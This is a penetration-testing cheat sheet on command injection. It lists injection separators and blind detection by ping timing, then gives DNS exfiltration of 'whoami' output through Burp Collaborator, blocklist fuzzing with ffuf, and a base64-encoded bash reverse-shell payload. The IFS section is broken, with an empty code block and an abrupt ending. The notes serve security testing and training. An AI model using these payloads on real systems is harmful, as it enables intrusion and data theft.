# Cmd Injection

## Where Would You Find Command Injection

* In the following places:
* Text boxes that take in input
* Hidden URLs that take input
* E.g. `/execute/command-name`
* Or through queries e.g. `/location?parameter=command`
* When using URLs, remember to URL encode the characters that arenâ€™t accepted
* Hidden ports:
* Some frameworks open debug ports that take in arbitrary commands

### Overview

* Use command line symbols within the input to alter the executed command
* Pay close attention to functions within an application that tend to be performed by an OS command
* Two forms exist, blind command injection --> you do not see the returned output, and non-blind cmd injection --> the system command output gets returned back to you
* Ensure you use the proper system commands per the OS

```
cat vs type 
ping -c vs ping -n #ping -n causes an infinte ping loop in linux
ls vs dir
```

* Try to start with reading a world readable file&#x20;

## Non-Blind CMD Inj.

* At the most basic level:
* Use command line symbols within the input to alter the executed command
* Once you have identified a potential injection point, use command line symbols within the input to alter the executed command&#x20;

```
; | || & && > >>
```

* Once you have exploited non-blind cmd injection, escalate to a reverse shell.

### Blind CMD Injection

#### Identification

* ICMP and DNS are useful to determine blind cmd injection&#x20;

```
google.com; ping -c11 127.0.0.1 #server will hang for roughly 10 seconds
```

* Can also try to ping yourself, however many corporate environments have firewalls in place to stop this, so doesn't always mean blind cmd injection isn't taking place&#x20;
* Use `tcpdump` to capture the `icmp` echo requests.

* This proves blind cmd injection, escalate to reverse shell

### Burp Collaborator

* Launch Burp, and choose:

![](<../.gitbook/assets/image (1) (2) (1).png>)

```
Burp --> Burp Collaborator Client
Press --> "Copy to Clipboard" #to copy a randomly generated domain name
Execute your cmd injection
```

* Press `Poll Now` to see if the request came through&#x20;

* If the above worked, move down to Data Exfil section

### **Data Exfil via DNS and Burp Collaborator**&#x20;

* Once you have your Burp Collaborator Domain, try your command injection&#x20;

```
google.com; a=$(whoami|base32|tr -d =); nslookup $a.COLLAB_DOMAIN_NAME.com
```

* Press Poll now and you should have something returned like this:

```
O53XOLLEMF2GCCQ.323lijijf90304jklksjru43k23.oastify.com
```

* Then type the following in your local terminal&#x20;

```
echo -n O53XOLLEMF2GCCQ | wc -c
```

* If this fails as `Invalid Base32` add 1, or 2 equal signs at the end for padding

```
echo -n O53XOLLEMF2GCCQ= | base32 -d
#output:
www-data
```

### Bypassing Character Blocklist with ffuf

* If you see that some special characters are banned, create a burp request to the resource you want to test
* It should be a post request
* Identify the parameter that it is using to post the data to the server&#x20;

```
name=;ls
```

* Swap out the command injection attempt that is getting blocked in the burp request with:

```
name=FUZZ
```

* Save the burp request to your local machine in a file&#x20;

```
ffuf -request search.request --request-proto http -w /opt/Seclists/Fuzzing/special-chars.txt
```

* You usually will have to ignore the `&` character as many webservers will think you are going to pass in another parameter
* Now that you have your results back you must filter out the most common side that you see being returned&#x20;
* `-fs 724`
* Can comma seperate filter size i.e. you see alot of 724 and 726 returned saying that character you posted is blocked&#x20;
* `-fs 724,726`
* Ensure you also `-mc all` or match code to see all the different http status codes returned, look for 5XX errors&#x20;
* If you see errors on:

```
{ == SSTI
; | & == cmd injection
' " == SQLI
```

### IFS Bypass No Spaces CmdInjection

* whitespace bypass&#x20;

```

* can see above that the username (our injection point) cannot contain spaces, we can use `{IFS}`to bypass this restriction and get cmd injection
* Gaining a reverse shell, encode your payload and have it decode and execute to avoid special character issues&#x20;

```
echo "bash -i >& /dev/tcp/10.10.14.157/1234 0>&1" | base64 -w 0
